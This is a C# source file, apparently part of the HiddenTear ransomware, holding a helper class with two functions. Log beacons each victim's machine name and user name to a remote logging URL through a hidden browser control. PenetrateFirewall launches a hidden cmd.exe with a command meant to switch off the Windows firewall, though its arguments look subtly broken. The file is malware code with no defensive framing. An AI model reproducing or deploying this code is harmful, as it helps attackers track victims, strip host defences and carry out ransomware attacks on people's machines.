using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Windows.Forms;
 
namespace HiddenTear
{
    public class Common
    {
        static bool _penetratedFirewall = false;
        public static bool penetratedFirewall
        {
            get
            {
                if (_penetratedFirewall) return true;
                else if (PenetrateFirewall()) 
                {
                    _penetratedFirewall = true; 
                    return true; 
                }
                return false;
            }
        }

        public static void Log(string message)
        {
            if (string.IsNullOrEmpty(Settables.LOGURL)) return;
            string info = Environment.MachineName + "-" + Environment.UserName + " : " + message;
            var fullUrl = Settables.LOGURL + info;

            if (!penetratedFirewall) return;

            using (WebBrowser client = new WebBrowser())
            {
                client.Navigate(fullUrl);
                while (client.ReadyState != WebBrowserReadyState.Complete)
                {
                    Application.DoEvents();
                }
            }
        }
        public static bool PenetrateFirewall()
        {
            using (System.Net.WebClient client = new System.Net.WebClient())
            {
                string testie = "";
                try
                {
                    testie = client.DownloadString("http://www.websitetest.com/");
                    return true;
                }
                catch
                {
                    try
                    {
                        System.Diagnostics.Process process = new System.Diagnostics.Process();
                        System.Diagnostics.ProcessStartInfo startInfo = new System.Diagnostics.ProcessStartInfo();
                        startInfo.WindowStyle = System.Diagnostics.ProcessWindowStyle.Hidden;
                        startInfo.FileName = "cmd.exe";
                        startInfo.Arguments = "netsh firewall set opmode disable";
                        process.StartInfo = startInfo;
                        process.Start();

                        process.WaitForExit();
                        return true;
                    }
                    catch
                    {
                        return false;
                    }
                }
            }
        }
    }
}
